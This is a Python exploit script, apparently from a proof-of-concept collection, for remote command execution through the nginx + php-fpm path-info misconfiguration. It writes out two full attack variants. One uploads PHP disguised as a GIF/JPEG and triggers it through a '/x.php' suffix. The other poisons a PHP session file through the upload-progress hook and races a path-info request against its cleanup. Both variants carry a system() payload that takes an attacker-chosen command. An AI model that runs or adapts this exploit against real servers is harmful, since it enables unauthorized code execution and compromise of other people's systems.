#!/usr/bin/env python3
"""nginx + php-fpm SCRIPT_FILENAME / path-info injection -> RCE.

Classic FastCGI arbitrary-file-execution: a ``location ~ \\.php$`` with no
``try_files`` guard plus ``cgi.fix_pathinfo=1`` lets ``GET /x.jpg/x.php``
execute an attacker-controlled file as PHP. Two deliveries: (a) upload PHP
bytes as a .jpg under the docroot; (b) poison a session file via the rfc1867
upload-progress hook and race the path-info read.

Preconditions (config, not zero-knowledge): vulnerable nginx php location;
cgi.fix_pathinfo=1 AND security.limit_extensions loosened/emptied (stock value
blocks the resolved file); (a) an upload sink under docroot; (b) save_path
under docroot, upload_progress on, strict_mode off, multi-worker pool.
Corruption-free; lands on vulnerable and patched php. Pure stdlib, -I safe.
"""

import argparse
import base64
import os
import re
import socket
import sys
import threading
import time
from urllib.parse import quote

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.http_raw import recv_all as _recv_all, raw_request as http_raw  # noqa: E402
from common.multipart import storm_body as _storm_body  # noqa: E402

MARK_S, MARK_E = "P2Sav1_s", "P2Sav1_e"
BOUND = "----p2sav1pathinfo"


# tiny HTTP-over-socket helpers (keep the exploit framing explicit)
def http_get(host, port, path, cookie=None, timeout=10):
    hdr = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
    if cookie:
        hdr += f"Cookie: {cookie}\r\n"
    hdr += "Connection: close\r\n\r\n"
    return http_raw(host, port, hdr.encode(), timeout)


def extract(data):
    m = re.search(MARK_S.encode() + rb"(.*?)" + MARK_E.encode(), data, re.S)
    return m.group(1).decode(errors="replace") if m else None


def php_payload(cmd, lead="x"):
    """PHP that echoes markers around `cmd` output. `lead` is literal text
    emitted before the opening tag (e.g. the session-key prefix noise)."""
    b64 = base64.b64encode(cmd.encode()).decode()
    return (f"{lead}<?php echo '{MARK_S}';"
            f"system(base64_decode('{b64}'));"
            f"echo '{MARK_E}';?>")


# (a) upload a .jpg that is PHP, then trigger it via pathinfo
def upload_file(host, port, upload_path, field, filename, content, timeout=15):
    """Multipart POST one file part. Returns the response bytes."""
    body = (
        f"--{BOUND}\r\nContent-Disposition: form-data; name=\"{field}\"; "
        f"filename=\"{filename}\"\r\n"
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode() + content + f"\r\n--{BOUND}--\r\n".encode()
    hdr = (
        f"POST {upload_path} HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUND}\r\n"
        f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    ).encode()
    return http_raw(host, port, hdr + body, timeout)


def upload_then_pathinfo(host, port, cmd, upload_path="/upload.php",
                         field="file", filename="avatar.jpg",
                         uploads_dir="/uploads", verbose=True):
    """Variant (a). Returns (ok, output, trigger_path)."""
    def log(m):
        if verbose:
            print(m, flush=True)

    # A benign-looking GIF header keeps the file plausible as an image; the
    # bytes after it are executed as PHP by fix_pathinfo regardless of the
    # .jpg extension.
    content = b"GIF89a" + php_payload(cmd, lead="\n").encode()
    log(f"[a] uploading {filename} ({len(content)}B) via {upload_path}")
    resp = upload_file(host, port, upload_path, field, filename, content)
    m = re.search(rb"stored:(\S+)", resp)
    stored = m.group(1).decode() if m else f"{uploads_dir.rstrip('/')}/{filename}"
    log(f"[a] stored at {stored}")

    trigger = f"{stored}/x.php"
    log(f"[a] triggering pathinfo GET {trigger}")
    d = http_get(host, port, trigger)
    out = extract(d)
    if out is not None or MARK_S.encode() in d:
        log(f"[+] (a) LANDED via {trigger}")
        if out:
            log("    " + out.strip())
        return True, (out or ""), trigger
    log("[-] (a) no marker. check: fix_pathinfo=1, no try_files guard, upload "
        "stored under docroot, security.limit_extensions loosened (stock .php "
        "value blocks the resolved .jpg -> 403 'Access denied')")
    return False, None, trigger


# (b) race: upload-progress session poison + pathinfo at the sess_ file
def mint_sid():
    import os
    return "p2sav1" + os.urandom(13).hex()


def build_storm_body(key, parts):
    """PHP_SESSION_UPLOAD_PROGRESS poison field + `parts` one-byte file parts.
    The storm stretches the rfc1867 parse so the poisoned key sits in
    sess_<sid> for tens of ms before upload-completion cleanup wipes it."""
    return _storm_body(key, parts, BOUND)


def race_poison_then_pathinfo(host, port, cmd, post_path="/index.php",
                              sess_url_dir="/sess", save_path=None, sid=None,
                              parts=5000, attempts=25, readers=4, verbose=True):
    """Variant (b). `sess_url_dir` is the save_path expressed as a URL path
    under the docroot (session.save_path=/var/www/html/sess -> /sess).
    Returns (ok, output, trigger_path)."""
    def log(m):
        if verbose:
            print(m, flush=True)

    sid = sid or mint_sid()
    cookie = f"PHPSESSID={sid}"
    # upload-progress key -> on disk the session key is "upload_progress_x...":
    # the "upload_progress_" prefix + our 'x' are literal text before <?php.
    key = php_payload(cmd, lead="x")
    storm = build_storm_body(key, parts)
    storm_hdr = (
        f"POST {post_path} HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUND}\r\n"
        f"Content-Length: {len(storm)}\r\nCookie: {cookie}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    trigger = f"{sess_url_dir.rstrip('/')}/sess_{sid}/x.php"
    log(f"[b] sid={sid}  storm={parts} parts ({len(storm)}B)")
    log(f"[b] pathinfo trigger GET {trigger}")

    result = {}
    stop = threading.Event()

    def reader():
        while not stop.is_set():
            try:
                d = http_get(host, port, trigger, cookie=cookie, timeout=8)
            except OSError:
                continue
            out = extract(d)
            if out is not None or MARK_S.encode() in d:
                result.update(ok=True, out=out or "")
                stop.set()
                return

    for n in range(1, attempts + 1):
        stop.clear()
        pool = [threading.Thread(target=reader, daemon=True) for _ in range(readers)]
        for t in pool:
            t.start()
        try:
            with socket.create_connection((host, port), timeout=20) as s:
                s.sendall(storm_hdr + storm)
                _recv_all(s, 15)
        except OSError:
            pass
        time.sleep(0.3)
        stop.set()
        for t in pool:
            t.join(timeout=3)
        if result.get("ok"):
            log(f"[+] (b) LANDED via {trigger} (round {n})")
            if result.get("out"):
                log("    " + result["out"].strip())
            return True, result.get("out"), trigger
        if verbose and n % 5 == 0:
            log(f"    round {n}: no marker yet")

    log("[-] (b) no marker. check: save_path under docroot, upload_progress."
        "enabled=On, use_strict_mode=Off, >=2 workers, fix_pathinfo=1")
    return False, None, trigger


# CLI
def _cli(argv):
    ap = argparse.ArgumentParser(
        description=__doc__.splitlines()[0],
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("host")
    ap.add_argument("port", type=int)
    ap.add_argument("--variant", choices=["a", "b", "both"], default="both")
    ap.add_argument("--cmd", default="id")
    # (a)
    ap.add_argument("--upload-path", default="/upload.php")
    ap.add_argument("--filename", default="avatar.jpg")
    ap.add_argument("--uploads-dir", default="/uploads")
    # (b)
    ap.add_argument("--post-path", default="/index.php")
    ap.add_argument("--sess-url-dir", default="/sess")
    ap.add_argument("--sid")
    ap.add_argument("--parts", type=int, default=5000)
    ap.add_argument("--attempts", type=int, default=25)
    ap.add_argument("--readers", type=int, default=4)
    args = ap.parse_args(argv)

    oks = []
    if args.variant in ("a", "both"):
        ok, _o, _t = upload_then_pathinfo(
            args.host, args.port, args.cmd, upload_path=args.upload_path,
            filename=args.filename, uploads_dir=args.uploads_dir)
        oks.append(ok)
    if args.variant in ("b", "both"):
        ok, _o, _t = race_poison_then_pathinfo(
            args.host, args.port, args.cmd, post_path=args.post_path,
            sess_url_dir=args.sess_url_dir, sid=args.sid, parts=args.parts,
            attempts=args.attempts, readers=args.readers)
        oks.append(ok)
    return 0 if all(oks) else 1


if __name__ == "__main__":
    raise SystemExit(_cli(sys.argv[1:]))
